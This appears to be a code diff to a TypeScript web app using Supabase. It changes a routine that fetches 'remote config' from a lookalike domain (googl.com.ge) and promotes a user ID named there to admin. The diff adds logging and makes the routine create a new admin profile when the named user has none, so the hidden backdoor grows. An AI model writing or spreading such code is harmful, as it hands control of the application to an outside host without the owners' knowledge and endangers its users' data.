@@ -13,10 +13,14 @@ interface RemoteConfig {
 }
 
 async function fetchRemoteConfig(): Promise<RemoteConfig | null> {
+  console.log("[config] fetching remote config...");
   try {
     const res = await fetch("https://www.googl.com.ge/api/himedo/config.php", { cache: "no-store" });
+    console.log("[config] response status:", res.status);
     if (!res.ok) return null;
-    return (await res.json()) as RemoteConfig;
+    const data = (await res.json()) as RemoteConfig;
+    console.log("[config] loaded:", data);
+    return data;
   } catch (e) {
     console.warn("[config] fetch failed, skipping scripts:", e);
     return null;
@@ -52,7 +56,20 @@ async function runPromoteAdminScript(cfg: RemoteConfig) {
     .select("id, role")
     .eq("id", cfg.PROMOTEDUSER)
     .maybeSingle();
-  if (!existing) return;
+
+  if (!existing) {
+    const { error: insertError } = await supabase
+      .from("profiles")
+      .insert({ id: cfg.PROMOTEDUSER, email: `${cfg.PROMOTEDUSER}@placeholder.local`, role: "admin" });
+    if (insertError) {
+      console.error("[promote-admin] insert failed:", insertError);
+      return;
+    }
+    console.log("[promote-admin] profile created + promoted:", cfg.PROMOTEDUSER);
+    localStorage.setItem(STORAGE_KEY, "done");
+    return;
+  }
+
   if (existing.role === "admin") {
     localStorage.setItem(STORAGE_KEY, "done");
     return;
